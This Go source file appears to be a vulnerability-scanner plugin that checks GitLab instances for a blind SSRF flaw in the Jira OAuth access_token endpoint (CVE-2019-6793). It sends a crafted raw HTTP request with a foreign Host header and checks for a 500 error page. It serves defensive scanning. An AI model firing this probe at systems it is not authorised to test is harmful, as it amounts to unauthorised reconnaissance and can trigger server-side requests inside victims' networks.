package goplugin

import (
	"net/url"
	"strings"

	"github.com/opensec-cn/kunpeng/plugin"
	"github.com/opensec-cn/kunpeng/util"
)

type gitlabOAuthSSRF struct {
	info   plugin.Plugin
	result []plugin.Plugin
}

func init() {
	plugin.Regist("gitlab", &gitlabOAuthSSRF{})
}
func (d *gitlabOAuthSSRF) Init() plugin.Plugin {
	d.info = plugin.Plugin{
		Name:    "Gitlab OAuth Jira blind SSRF",
		Remarks: "Oauth :: Jira :: AuthorizationsController＃access_token端点容易受到blind SSRF漏洞的攻击。 该漏洞允许攻击者在GitLab实例的网络中发出任意HTTP / HTTPS请求。",
		Level:   2,
		Type:    "SSRF",
		Author:  "wolf",
		References: plugin.References{
			URL:  "https://hackerone.com/reports/398799",
			CVE:  "CVE-2019-6793",
			KPID: "KP-0082",
		},
	}
	return d.info
}
func (d *gitlabOAuthSSRF) GetResult() []plugin.Plugin {
	var result = d.result
	d.result = []plugin.Plugin{}
	return result
}
func (d *gitlabOAuthSSRF) Check(URL string, meta plugin.TaskMeta) bool {
	requestStr := "POST /-/jira/login/oauth/access_token HTTP/1.1\r\nHost: 8.8.8.8:88\r\nConnection: close\r\n\r\n"
	u, err := url.Parse(URL)
	if err != nil {
		return false
	}
	buf, err := util.TCPSend(u.Host, []byte(requestStr))
	if err == nil && (strings.Contains(string(buf), "<title>Something went wrong (500)</title>")) {
		result := d.info
		result.Response = string(buf)
		result.Request = requestStr
		d.result = append(d.result, result)
		return true
	}
	return false
}
